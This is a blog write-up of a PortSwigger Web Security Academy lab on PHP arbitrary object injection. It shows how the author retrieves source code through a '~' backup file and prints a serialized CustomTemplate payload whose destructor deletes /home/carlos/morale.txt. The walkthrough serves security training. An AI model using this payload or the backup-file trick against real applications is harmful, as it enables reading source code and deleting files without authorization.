<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Lab: Arbitrary object injection in PHP
  #


  tags: Portswigger Web Security Academy Web
  #


Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.
Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter
Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.


  Constructor & Deconstructor
  #

Python建構函式與解構函式（init()和__del__()）
其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已
而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Lab: Arbitrary object injection in PHP"><meta property="og:description" content="Lab: Arbitrary object injection in PHP # tags: Portswigger Web Security Academy Web # Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. Constructor & Deconstructor # Python建構函式與解構函式（init()和__del__()） 其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已 而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Portswigger Web Security Academy"><meta property="article:tag" content="Web"><title>Lab: Arbitrary object injection in PHP | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Lab: Arbitrary object injection in PHP</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#constructor--deconstructor>Constructor & Deconstructor</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp---deconstructor>Exp - Deconstructor</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=lab-arbitrary-object-injection-in-php>Lab: Arbitrary object injection in PHP
<a class=anchor href=#lab-arbitrary-object-injection-in-php>#</a></h1><h6 id=tags-portswigger-web-security-academy-web>tags: <code>Portswigger Web Security Academy</code> <code>Web</code>
<a class=anchor href=#tags-portswigger-web-security-academy-web>#</a></h6><ul><li>Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result.</li><li>Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter</li><li>Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.</li></ul><h2 id=constructor--deconstructor>Constructor & Deconstructor
<a class=anchor href=#constructor--deconstructor>#</a></h2><p><a href=https://tw511.com/a/01/26451.html>Python建構函式與解構函式（<strong>init</strong>()和__del__()）</a>
其實概念就是Python的<code>__init()__</code> function，在instanciate一個class的時候扮演初始化的功能而已
而deconstructor就是Python中的<code>__del__()</code> function用來回收不需要的class，以達到降低記憶體的使用量</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li><p>Login and Recon
As the solution of this lab, we first need to arbitrary query something in this website, e.g. query <code>My account</code> and forward all packages</p></li><li><p>Use Target Feature in Burp Suite
In my case, the URL of this lab is <code>https://0a29005704ba2655802d8a75009100d5.web-security-academy.net/my-account?id=wiener</code></p><p>So, I can search it in target feature to browse all query of this website.
<img src=https://i.imgur.com/SWrrzgI.png alt></p></li><li><p><font color=FF0000>通靈</font>Something Interesting - <code>/libs/CustomTemplate.php</code>
This file may be a vulnerability to achieve our goal.</p></li><li><p>Send to repeater
Obviously, you can not access the content first.
<img src=https://i.imgur.com/D31vFeN.png alt></p><p>By the hint. The solution is using <code>~</code> character to read the source code
<img src=https://i.imgur.com/1N1EpQh.png alt></p><p>:::spoiler CustomTemplate.php Source Code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this-&gt;template_file_path = $template_file_path;
        $this-&gt;lock_file_path = $template_file_path . &#34;.lock&#34;;
    }

    private function isTemplateLocked() {
        return file_exists($this-&gt;lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this-&gt;template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this-&gt;lock_file_path, &#34;&#34;) === false) {
                throw new Exception(&#34;Could not write to &#34; . $this-&gt;lock_file_path);
            }
            if (file_put_contents($this-&gt;template_file_path, $template) === false) {
                throw new Exception(&#34;Could not write to &#34; . $this-&gt;template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this-&gt;lock_file_path)) {
            unlink($this-&gt;lock_file_path);
        }
    }
}

?&gt;
</code></pre><p>:::</p><p>In this example, we notice that it has constructor and deconstructor so we can constuct a serialization string to delete something</p></li></ol><h2 id=exp---deconstructor>Exp - Deconstructor
<a class=anchor href=#exp---deconstructor>#</a></h2><p>Exploit Payload:</p><pre tabindex=0><code class=language-php! data-lang=php!>O:14:&#34;CustomTemplate&#34;:1:{s:14:&#34;lock_file_path&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
</code></pre><p>Then send it directly and we can delete the specific file properly.
:::spoiler Success Screenshot
<img src=https://i.imgur.com/NXvqtr5.png alt></p><p>:::</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#constructor--deconstructor>Constructor & Deconstructor</a></li><li><a href=#recon>Recon</a></li><li><a href=#exp---deconstructor>Exp - Deconstructor</a></li></ul></nav></div></aside></main></body></html>